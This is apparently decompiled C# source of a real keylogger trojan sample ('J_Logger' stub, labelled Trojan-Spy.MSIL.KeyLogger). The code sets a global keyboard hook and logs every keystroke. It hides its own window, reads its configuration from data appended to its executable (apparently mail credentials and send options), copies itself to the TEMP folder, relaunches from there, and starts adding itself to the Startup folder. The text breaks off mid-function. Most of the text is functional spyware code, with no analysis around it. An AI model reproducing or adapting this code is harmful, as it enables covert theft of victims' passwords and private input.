// Decompiled with JetBrains decompiler
// Type: J_Logger_Public_Stub.Form1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A1FB8C7A-C4EB-4CE2-93CC-E7DB21982219
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.jfp-eb435cb8aa395a686c2ec0b5da425f674e7253fbc98eca186fa2f25fff096417.exe

using J_Logger_Public_Stub.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace J_Logger_Public_Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    private string[] options;
    private string text1;
    private string text2;
    private string text3;
    private string text4;
    private string text5;
    private string text6;
    private string text7;
    private string text8;
    private string text9;
    private string text10;
    private const string FileSplit = "@jojogizmojake@";
    private string us;
    private string pa;
    private string t0;
    private string pr0ccess;
    private string up;
    private string screen;
    private string ncrypt;
    private string sendl;
    private string sends;
    private string jojo;
    private string TEMP;
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private string strin;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.TEMP = Path.GetTempPath();
      this.kbHook = new Form1.KeyboardHook();
      this.strin = (string) null;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Label1 = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      this.Label1.Location = new Point(4, 7);
      this.Label1.Name = "Label1";
      Label label1 = this.Label1;
      Size size1 = new Size(11, 13);
      Size size2 = size1;
      label1.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "''";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(10, 13);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    private virtual Form1.KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => this._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.KeyDownEventHandler downEventHandler = new Form1.KeyboardHook.KeyDownEventHandler(this.shiftandcaps);
        if (this._kbHook != null)
          Form1.KeyboardHook.KeyDown -= downEventHandler;
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        Form1.KeyboardHook.KeyDown += downEventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    public void shiftandcaps(Keys Key)
    {
      if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.jojo += "[DEL]";
            break;
          case Keys.Tab:
            this.jojo += "[TAB]";
            break;
          case Keys.Return:
            this.jojo += "\r\n";
            break;
          case Keys.Escape:
            this.jojo += "[ESC]";
            break;
          case Keys.Space:
            this.jojo += " ";
            break;
          case Keys.End:
            this.jojo += "[END]";
            break;
          case Keys.Left:
            this.jojo += "?";
            break;
          case Keys.Up:
            this.jojo += "?";
            break;
          case Keys.Right:
            this.jojo += "?";
            break;
          case Keys.Down:
            this.jojo += "?";
            break;
          case Keys.Delete:
            this.jojo += "[DEL]";
            break;
          case Keys.D0:
            this.jojo += "0";
            break;
          case Keys.D1:
            this.jojo += "1";
            break;
          case Keys.D2:
            this.jojo += "2";
            break;
          case Keys.D3:
            this.jojo += "3";
            break;
          case Keys.D4:
            this.jojo += "4";
            break;
          case Keys.D5:
            this.jojo += "5";
            break;
          case Keys.D6:
            this.jojo += "6";
            break;
          case Keys.D7:
            this.jojo += "7";
            break;
          case Keys.D8:
            this.jojo += "8";
            break;
          case Keys.D9:
            this.jojo += "9";
            break;
          case Keys.A:
            this.jojo += "a";
            break;
          case Keys.B:
            this.jojo += "b";
            break;
          case Keys.C:
            this.jojo += "c";
            break;
          case Keys.D:
            this.jojo += "d";
            break;
          case Keys.E:
            this.jojo += "e";
            break;
          case Keys.F:
            this.jojo += "f";
            break;
          case Keys.G:
            this.jojo += "g";
            break;
          case Keys.H:
            this.jojo += "h";
            break;
          case Keys.I:
            this.jojo += "i";
            break;
          case Keys.J:
            this.jojo += "j";
            break;
          case Keys.K:
            this.jojo += "k";
            break;
          case Keys.L:
            this.jojo += "l";
            break;
          case Keys.M:
            this.jojo += "m";
            break;
          case Keys.N:
            this.jojo += "n";
            break;
          case Keys.O:
            this.jojo += "o";
            break;
          case Keys.P:
            this.jojo += "p";
            break;
          case Keys.Q:
            this.jojo += "q";
            break;
          case Keys.R:
            this.jojo += "r";
            break;
          case Keys.S:
            this.jojo += "s";
            break;
          case Keys.T:
            this.jojo += "t";
            break;
          case Keys.U:
            this.jojo += "u";
            break;
          case Keys.V:
            this.jojo += "v";
            break;
          case Keys.W:
            this.jojo += "w";
            break;
          case Keys.X:
            this.jojo += "x";
            break;
          case Keys.Y:
            this.jojo += "y";
            break;
          case Keys.Z:
            this.jojo += "z";
            break;
          case Keys.NumPad0:
            this.jojo += "0";
            break;
          case Keys.NumPad1:
            this.jojo += "1";
            break;
          case Keys.NumPad2:
            this.jojo += "2";
            break;
          case Keys.NumPad3:
            this.jojo += "3";
            break;
          case Keys.NumPad4:
            this.jojo += "4";
            break;
          case Keys.NumPad5:
            this.jojo += "5";
            break;
          case Keys.NumPad6:
            this.jojo += "6";
            break;
          case Keys.NumPad7:
            this.jojo += "7";
            break;
          case Keys.NumPad8:
            this.jojo += "8";
            break;
          case Keys.NumPad9:
            this.jojo += "9";
            break;
          case Keys.Multiply:
            this.jojo += "*";
            break;
          case Keys.Add:
            this.jojo += "+";
            break;
          case Keys.Subtract:
            this.jojo += "-";
            break;
          case Keys.Decimal:
            this.jojo += ".";
            break;
          case Keys.Divide:
            this.jojo += "/";
            break;
          case Keys.F1:
            this.jojo += "[F1]";
            break;
          case Keys.F2:
            this.jojo += "[F2]";
            break;
          case Keys.F3:
            this.jojo += "[F3]";
            break;
          case Keys.F4:
            this.jojo += "[F4]";
            break;
          case Keys.F5:
            this.jojo += "[F5]";
            break;
          case Keys.F6:
            this.jojo += "[F6]";
            break;
          case Keys.F7:
            this.jojo += "[F7]";
            break;
          case Keys.F8:
            this.jojo += "[F8]";
            break;
          case Keys.F9:
            this.jojo += "[F9]";
            break;
          case Keys.F10:
            this.jojo += "[F10]";
            break;
          case Keys.F11:
            this.jojo += "[F11]";
            break;
          case Keys.F12:
            this.jojo += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.jojo += ";";
            break;
          case Keys.Oemcomma:
            this.jojo += ",";
            break;
          case Keys.OemMinus:
            this.jojo += "-";
            break;
          case Keys.OemPeriod:
            this.jojo += ".";
            break;
          case Keys.OemQuestion:
            this.jojo += "/";
            break;
          case Keys.Oemtilde:
            this.jojo += "`";
            break;
          case Keys.OemOpenBrackets:
            this.jojo += "[";
            break;
          case Keys.OemPipe:
            this.jojo += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.jojo += "]";
            break;
          case Keys.OemQuotes:
            this.jojo += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.jojo += "[DEL]";
            break;
          case Keys.Tab:
            this.jojo += "[TAB]";
            break;
          case Keys.Return:
            this.jojo += "\r\n";
            break;
          case Keys.Escape:
            this.jojo += "[ESC]";
            break;
          case Keys.Space:
            this.jojo += " ";
            break;
          case Keys.End:
            this.jojo += "[END]";
            break;
          case Keys.Left:
            this.jojo += "?";
            break;
          case Keys.Up:
            this.jojo += "?";
            break;
          case Keys.Right:
            this.jojo += "?";
            break;
          case Keys.Down:
            this.jojo += "?";
            break;
          case Keys.Delete:
            this.jojo += "[DEL]";
            break;
          case Keys.D0:
            this.jojo += "0";
            break;
          case Keys.D1:
            this.jojo += "1";
            break;
          case Keys.D2:
            this.jojo += "2";
            break;
          case Keys.D3:
            this.jojo += "3";
            break;
          case Keys.D4:
            this.jojo += "4";
            break;
          case Keys.D5:
            this.jojo += "5";
            break;
          case Keys.D6:
            this.jojo += "6";
            break;
          case Keys.D7:
            this.jojo += "7";
            break;
          case Keys.D8:
            this.jojo += "8";
            break;
          case Keys.D9:
            this.jojo += "9";
            break;
          case Keys.A:
            this.jojo += "A";
            break;
          case Keys.B:
            this.jojo += "B";
            break;
          case Keys.C:
            this.jojo += "C";
            break;
          case Keys.D:
            this.jojo += "D";
            break;
          case Keys.E:
            this.jojo += "E";
            break;
          case Keys.F:
            this.jojo += "F";
            break;
          case Keys.G:
            this.jojo += "G";
            break;
          case Keys.H:
            this.jojo += "H";
            break;
          case Keys.I:
            this.jojo += "I";
            break;
          case Keys.J:
            this.jojo += "J";
            break;
          case Keys.K:
            this.jojo += "K";
            break;
          case Keys.L:
            this.jojo += "L";
            break;
          case Keys.M:
            this.jojo += "M";
            break;
          case Keys.N:
            this.jojo += "N";
            break;
          case Keys.O:
            this.jojo += "O";
            break;
          case Keys.P:
            this.jojo += "P";
            break;
          case Keys.Q:
            this.jojo += "Q";
            break;
          case Keys.R:
            this.jojo += "R";
            break;
          case Keys.S:
            this.jojo += "S";
            break;
          case Keys.T:
            this.jojo += "T";
            break;
          case Keys.U:
            this.jojo += "U";
            break;
          case Keys.V:
            this.jojo += "V";
            break;
          case Keys.W:
            this.jojo += "W";
            break;
          case Keys.X:
            this.jojo += "X";
            break;
          case Keys.Y:
            this.jojo += "Y";
            break;
          case Keys.Z:
            this.jojo += "Z";
            break;
          case Keys.NumPad0:
            this.jojo += "0";
            break;
          case Keys.NumPad1:
            this.jojo += "1";
            break;
          case Keys.NumPad2:
            this.jojo += "2";
            break;
          case Keys.NumPad3:
            this.jojo += "3";
            break;
          case Keys.NumPad4:
            this.jojo += "4";
            break;
          case Keys.NumPad5:
            this.jojo += "5";
            break;
          case Keys.NumPad6:
            this.jojo += "6";
            break;
          case Keys.NumPad7:
            this.jojo += "7";
            break;
          case Keys.NumPad8:
            this.jojo += "8";
            break;
          case Keys.NumPad9:
            this.jojo += "9";
            break;
          case Keys.Multiply:
            this.jojo += "*";
            break;
          case Keys.Add:
            this.jojo += "+";
            break;
          case Keys.Subtract:
            this.jojo += "-";
            break;
          case Keys.Decimal:
            this.jojo += ".";
            break;
          case Keys.Divide:
            this.jojo += "/";
            break;
          case Keys.F1:
            this.jojo += "[F1]";
            break;
          case Keys.F2:
            this.jojo += "[F2]";
            break;
          case Keys.F3:
            this.jojo += "[F3]";
            break;
          case Keys.F4:
            this.jojo += "[F4]";
            break;
          case Keys.F5:
            this.jojo += "[F5]";
            break;
          case Keys.F6:
            this.jojo += "[F6]";
            break;
          case Keys.F7:
            this.jojo += "[F7]";
            break;
          case Keys.F8:
            this.jojo += "[F8]";
            break;
          case Keys.F9:
            this.jojo += "[F9]";
            break;
          case Keys.F10:
            this.jojo += "[F10]";
            break;
          case Keys.F11:
            this.jojo += "[F11]";
            break;
          case Keys.F12:
            this.jojo += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.jojo += ";";
            break;
          case Keys.Oemcomma:
            this.jojo += ",";
            break;
          case Keys.OemMinus:
            this.jojo += "-";
            break;
          case Keys.OemPeriod:
            this.jojo += ".";
            break;
          case Keys.OemQuestion:
            this.jojo += "/";
            break;
          case Keys.Oemtilde:
            this.jojo += "`";
            break;
          case Keys.OemOpenBrackets:
            this.jojo += "[";
            break;
          case Keys.OemPipe:
            this.jojo += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.jojo += "]";
            break;
          case Keys.OemQuotes:
            this.jojo += "'";
            break;
        }
      }
      else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.jojo += "[DEL]";
            break;
          case Keys.Tab:
            this.jojo += "[TAB]";
            break;
          case Keys.Return:
            this.jojo += "\r\n";
            break;
          case Keys.Escape:
            this.jojo += "[ESC]";
            break;
          case Keys.Space:
            this.jojo += " ";
            break;
          case Keys.End:
            this.jojo += "[END]";
            break;
          case Keys.Left:
            this.jojo += "?";
            break;
          case Keys.Up:
            this.jojo += "?";
            break;
          case Keys.Right:
            this.jojo += "?";
            break;
          case Keys.Down:
            this.jojo += "?";
            break;
          case Keys.Delete:
            this.jojo += "[DEL]";
            break;
          case Keys.D0:
            this.jojo += ")";
            break;
          case Keys.D1:
            this.jojo += "!";
            break;
          case Keys.D2:
            this.jojo += "@";
            break;
          case Keys.D3:
            this.jojo += "#";
            break;
          case Keys.D4:
            this.jojo += "$";
            break;
          case Keys.D5:
            this.jojo += "%";
            break;
          case Keys.D6:
            this.jojo += "^";
            break;
          case Keys.D7:
            this.jojo += "&";
            break;
          case Keys.D8:
            this.jojo += "*";
            break;
          case Keys.D9:
            this.jojo += "(";
            break;
          case Keys.A:
            this.jojo += "A";
            break;
          case Keys.B:
            this.jojo += "B";
            break;
          case Keys.C:
            this.jojo += "C";
            break;
          case Keys.D:
            this.jojo += "D";
            break;
          case Keys.E:
            this.jojo += "E";
            break;
          case Keys.F:
            this.jojo += "F";
            break;
          case Keys.G:
            this.jojo += "G";
            break;
          case Keys.H:
            this.jojo += "H";
            break;
          case Keys.I:
            this.jojo += "I";
            break;
          case Keys.J:
            this.jojo += "J";
            break;
          case Keys.K:
            this.jojo += "K";
            break;
          case Keys.L:
            this.jojo += "L";
            break;
          case Keys.M:
            this.jojo += "M";
            break;
          case Keys.N:
            this.jojo += "N";
            break;
          case Keys.O:
            this.jojo += "O";
            break;
          case Keys.P:
            this.jojo += "P";
            break;
          case Keys.Q:
            this.jojo += "Q";
            break;
          case Keys.R:
            this.jojo += "R";
            break;
          case Keys.S:
            this.jojo += "S";
            break;
          case Keys.T:
            this.jojo += "T";
            break;
          case Keys.U:
            this.jojo += "U";
            break;
          case Keys.V:
            this.jojo += "V";
            break;
          case Keys.W:
            this.jojo += "W";
            break;
          case Keys.X:
            this.jojo += "X";
            break;
          case Keys.Y:
            this.jojo += "Y";
            break;
          case Keys.Z:
            this.jojo += "Z";
            break;
          case Keys.Multiply:
            this.jojo += "*";
            break;
          case Keys.Add:
            this.jojo += "+";
            break;
          case Keys.Subtract:
            this.jojo += "-";
            break;
          case Keys.Decimal:
            this.jojo += ".";
            break;
          case Keys.Divide:
            this.jojo += "/";
            break;
          case Keys.F1:
            this.jojo += "[F1]";
            break;
          case Keys.F2:
            this.jojo += "[F2]";
            break;
          case Keys.F3:
            this.jojo += "[F3]";
            break;
          case Keys.F4:
            this.jojo += "[F4]";
            break;
          case Keys.F5:
            this.jojo += "[F5]";
            break;
          case Keys.F6:
            this.jojo += "[F6]";
            break;
          case Keys.F7:
            this.jojo += "[F7]";
            break;
          case Keys.F8:
            this.jojo += "[F8]";
            break;
          case Keys.F9:
            this.jojo += "[F9]";
            break;
          case Keys.F10:
            this.jojo += "[F10]";
            break;
          case Keys.F11:
            this.jojo += "[F11]";
            break;
          case Keys.F12:
            this.jojo += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.jojo += ":";
            break;
          case Keys.Oemcomma:
            this.jojo += "<";
            break;
          case Keys.OemMinus:
            this.jojo += "_";
            break;
          case Keys.OemPeriod:
            this.jojo += ">";
            break;
          case Keys.OemQuestion:
            this.jojo += "?";
            break;
          case Keys.Oemtilde:
            this.jojo += "~";
            break;
          case Keys.OemOpenBrackets:
            this.jojo += "{";
            break;
          case Keys.OemPipe:
            this.jojo += "|";
            break;
          case Keys.OemCloseBrackets:
            this.jojo += "}";
            break;
          case Keys.OemQuotes:
            this.jojo += this.Label1.Text;
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.jojo += "[DEL]";
            break;
          case Keys.Tab:
            this.jojo += "[TAB]";
            break;
          case Keys.Return:
            this.jojo += "\r\n";
            break;
          case Keys.Escape:
            this.jojo += "[ESC]";
            break;
          case Keys.Space:
            this.jojo += " ";
            break;
          case Keys.End:
            this.jojo += "[END]";
            break;
          case Keys.Left:
            this.jojo += "?";
            break;
          case Keys.Up:
            this.jojo += "?";
            break;
          case Keys.Right:
            this.jojo += "?";
            break;
          case Keys.Down:
            this.jojo += "?";
            break;
          case Keys.Delete:
            this.jojo += "[DEL]";
            break;
          case Keys.D0:
            this.jojo += "0";
            break;
          case Keys.D1:
            this.jojo += "1";
            break;
          case Keys.D2:
            this.jojo += "2";
            break;
          case Keys.D3:
            this.jojo += "3";
            break;
          case Keys.D4:
            this.jojo += "4";
            break;
          case Keys.D5:
            this.jojo += "5";
            break;
          case Keys.D6:
            this.jojo += "6";
            break;
          case Keys.D7:
            this.jojo += "7";
            break;
          case Keys.D8:
            this.jojo += "8";
            break;
          case Keys.D9:
            this.jojo += "9";
            break;
          case Keys.A:
            this.jojo += "a";
            break;
          case Keys.B:
            this.jojo += "b";
            break;
          case Keys.C:
            this.jojo += "c";
            break;
          case Keys.D:
            this.jojo += "d";
            break;
          case Keys.E:
            this.jojo += "e";
            break;
          case Keys.F:
            this.jojo += "f";
            break;
          case Keys.G:
            this.jojo += "g";
            break;
          case Keys.H:
            this.jojo += "h";
            break;
          case Keys.I:
            this.jojo += "i";
            break;
          case Keys.J:
            this.jojo += "j";
            break;
          case Keys.K:
            this.jojo += "k";
            break;
          case Keys.L:
            this.jojo += "l";
            break;
          case Keys.M:
            this.jojo += "m";
            break;
          case Keys.N:
            this.jojo += "n";
            break;
          case Keys.O:
            this.jojo += "o";
            break;
          case Keys.P:
            this.jojo += "p";
            break;
          case Keys.Q:
            this.jojo += "q";
            break;
          case Keys.R:
            this.jojo += "r";
            break;
          case Keys.S:
            this.jojo += "s";
            break;
          case Keys.T:
            this.jojo += "t";
            break;
          case Keys.U:
            this.jojo += "u";
            break;
          case Keys.V:
            this.jojo += "v";
            break;
          case Keys.W:
            this.jojo += "w";
            break;
          case Keys.X:
            this.jojo += "x";
            break;
          case Keys.Y:
            this.jojo += "y";
            break;
          case Keys.Z:
            this.jojo += "z";
            break;
          case Keys.Multiply:
            this.jojo += "*";
            break;
          case Keys.Add:
            this.jojo += "+";
            break;
          case Keys.Subtract:
            this.jojo += "-";
            break;
          case Keys.Decimal:
            this.jojo += ".";
            break;
          case Keys.Divide:
            this.jojo += "/";
            break;
          case Keys.F1:
            this.jojo += "[F1]";
            break;
          case Keys.F2:
            this.jojo += "[F2]";
            break;
          case Keys.F3:
            this.jojo += "[F3]";
            break;
          case Keys.F4:
            this.jojo += "[F4]";
            break;
          case Keys.F5:
            this.jojo += "[F5]";
            break;
          case Keys.F6:
            this.jojo += "[F6]";
            break;
          case Keys.F7:
            this.jojo += "[F7]";
            break;
          case Keys.F8:
            this.jojo += "[F8]";
            break;
          case Keys.F9:
            this.jojo += "[F9]";
            break;
          case Keys.F10:
            this.jojo += "[F10]";
            break;
          case Keys.F11:
            this.jojo += "[F11]";
            break;
          case Keys.F12:
            this.jojo += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.jojo += ";";
            break;
          case Keys.Oemcomma:
            this.jojo += ",";
            break;
          case Keys.OemMinus:
            this.jojo += "-";
            break;
          case Keys.OemPeriod:
            this.jojo += ".";
            break;
          case Keys.OemQuestion:
            this.jojo += "/";
            break;
          case Keys.Oemtilde:
            this.jojo += "`";
            break;
          case Keys.OemOpenBrackets:
            this.jojo += "[";
            break;
          case Keys.OemPipe:
            this.jojo += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.jojo += "]";
            break;
          case Keys.OemQuotes:
            this.jojo += "'";
            break;
        }
      }
      else
      {
        if (!(MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock))
          return;
        switch (Key)
        {
          case Keys.Back:
            this.jojo += "[DEL]";
            break;
          case Keys.Tab:
            this.jojo += "[TAB]";
            break;
          case Keys.Return:
            this.jojo += "\r\n";
            break;
          case Keys.Escape:
            this.jojo += "[ESC]";
            break;
          case Keys.Space:
            this.jojo += " ";
            break;
          case Keys.End:
            this.jojo += "[END]";
            break;
          case Keys.Left:
            this.jojo += "?";
            break;
          case Keys.Up:
            this.jojo += "?";
            break;
          case Keys.Right:
            this.jojo += "?";
            break;
          case Keys.Down:
            this.jojo += "?";
            break;
          case Keys.Delete:
            this.jojo += "[DEL]";
            break;
          case Keys.D0:
            this.jojo += ")";
            break;
          case Keys.D1:
            this.jojo += "!";
            break;
          case Keys.D2:
            this.jojo += "@";
            break;
          case Keys.D3:
            this.jojo += "#";
            break;
          case Keys.D4:
            this.jojo += "$";
            break;
          case Keys.D5:
            this.jojo += "%";
            break;
          case Keys.D6:
            this.jojo += "^";
            break;
          case Keys.D7:
            this.jojo += "&";
            break;
          case Keys.D8:
            this.jojo += "*";
            break;
          case Keys.D9:
            this.jojo += "(";
            break;
          case Keys.A:
            this.jojo += "A";
            break;
          case Keys.B:
            this.jojo += "B";
            break;
          case Keys.C:
            this.jojo += "C";
            break;
          case Keys.D:
            this.jojo += "D";
            break;
          case Keys.E:
            this.jojo += "E";
            break;
          case Keys.F:
            this.jojo += "F";
            break;
          case Keys.G:
            this.jojo += "G";
            break;
          case Keys.H:
            this.jojo += "H";
            break;
          case Keys.I:
            this.jojo += "I";
            break;
          case Keys.J:
            this.jojo += "J";
            break;
          case Keys.K:
            this.jojo += "K";
            break;
          case Keys.L:
            this.jojo += "L";
            break;
          case Keys.M:
            this.jojo += "M";
            break;
          case Keys.N:
            this.jojo += "N";
            break;
          case Keys.O:
            this.jojo += "O";
            break;
          case Keys.P:
            this.jojo += "P";
            break;
          case Keys.Q:
            this.jojo += "Q";
            break;
          case Keys.R:
            this.jojo += "R";
            break;
          case Keys.S:
            this.jojo += "S";
            break;
          case Keys.T:
            this.jojo += "T";
            break;
          case Keys.U:
            this.jojo += "U";
            break;
          case Keys.V:
            this.jojo += "V";
            break;
          case Keys.W:
            this.jojo += "W";
            break;
          case Keys.X:
            this.jojo += "X";
            break;
          case Keys.Y:
            this.jojo += "Y";
            break;
          case Keys.Z:
            this.jojo += "Z";
            break;
          case Keys.Multiply:
            this.jojo += "*";
            break;
          case Keys.Add:
            this.jojo += "+";
            break;
          case Keys.Subtract:
            this.jojo += "-";
            break;
          case Keys.Decimal:
            this.jojo += ".";
            break;
          case Keys.Divide:
            this.jojo += "/";
            break;
          case Keys.F1:
            this.jojo += "[F1]";
            break;
          case Keys.F2:
            this.jojo += "[F2]";
            break;
          case Keys.F3:
            this.jojo += "[F3]";
            break;
          case Keys.F4:
            this.jojo += "[F4]";
            break;
          case Keys.F5:
            this.jojo += "[F5]";
            break;
          case Keys.F6:
            this.jojo += "[F6]";
            break;
          case Keys.F7:
            this.jojo += "[F7]";
            break;
          case Keys.F8:
            this.jojo += "[F8]";
            break;
          case Keys.F9:
            this.jojo += "[F9]";
            break;
          case Keys.F10:
            this.jojo += "[F10]";
            break;
          case Keys.F11:
            this.jojo += "[F11]";
            break;
          case Keys.F12:
            this.jojo += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.jojo += ":";
            break;
          case Keys.Oemcomma:
            this.jojo += "<";
            break;
          case Keys.OemMinus:
            this.jojo += "_";
            break;
          case Keys.OemPeriod:
            this.jojo += ">";
            break;
          case Keys.OemQuestion:
            this.jojo += "?";
            break;
          case Keys.Oemtilde:
            this.jojo += "~";
            break;
          case Keys.OemOpenBrackets:
            this.jojo += "{";
            break;
          case Keys.OemPipe:
            this.jojo += "|";
            break;
          case Keys.OemCloseBrackets:
            this.jojo += "}";
            break;
          case Keys.OemQuotes:
            this.jojo += this.Label1.Text;
            break;
        }
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.Visible = false;
label_2:
        num3 = 3;
        Microsoft.VisualBasic.FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_3:
        num3 = 4;
        this.text1 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
label_4:
        num3 = 5;
        this.text2 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
label_5:
        num3 = 6;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text1);
label_6:
        num3 = 7;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text2);
label_7:
        num3 = 8;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text3);
label_8:
        num3 = 9;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text4);
label_9:
        num3 = 10;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text5);
label_10:
        num3 = 11;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text6);
label_11:
        num3 = 12;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text7);
label_12:
        num3 = 13;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text8);
label_13:
        num3 = 14;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text9);
label_14:
        num3 = 15;
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text10);
label_15:
        num3 = 16;
        Microsoft.VisualBasic.FileSystem.FileClose(1);
label_16:
        num3 = 17;
        this.options = Strings.Split(this.text1, "@jojogizmojake@");
label_17:
        num3 = 18;
        this.us = this.options[1];
label_18:
        num3 = 19;
        this.pa = this.options[2];
label_19:
        num3 = 20;
        this.t0 = this.options[3];
label_20:
        num3 = 21;
        this.sendl = this.options[4];
label_21:
        num3 = 22;
        this.screen = this.options[5];
label_22:
        num3 = 23;
        this.sends = this.options[6];
label_23:
        num3 = 24;
        this.ncrypt = this.options[7];
label_24:
        num3 = 25;
        this.up = this.options[8];
label_25:
        num3 = 26;
        this.pr0ccess = this.options[9];
label_26:
        num3 = 27;
        bool flag = MyProject.Computer.FileSystem.FileExists(this.TEMP + "\\" + this.pr0ccess);
label_27:
        num3 = 28;
        if (flag)
          goto label_31;
label_28:
        num3 = 29;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.TEMP + "\\" + this.pr0ccess);
label_29:
        num3 = 30;
        Process.Start(this.TEMP + "\\" + this.pr0ccess);
label_30:
        num3 = 31;
        this.Close();
label_31:
        num3 = 33;
        if (Operators.CompareString(this.up, "1", false) != 0)
          goto label_40;
label_32:
        num3 = 34;
        string pr0ccess = this.pr0ccess;
label_33:
        num3 = 35;
        string sourceFileName = this.TEMP + "\\" + this.pr0ccess;
label_34:
        num3 = 36;
        string path = "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\";
label_35:
        num3 = 37;
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
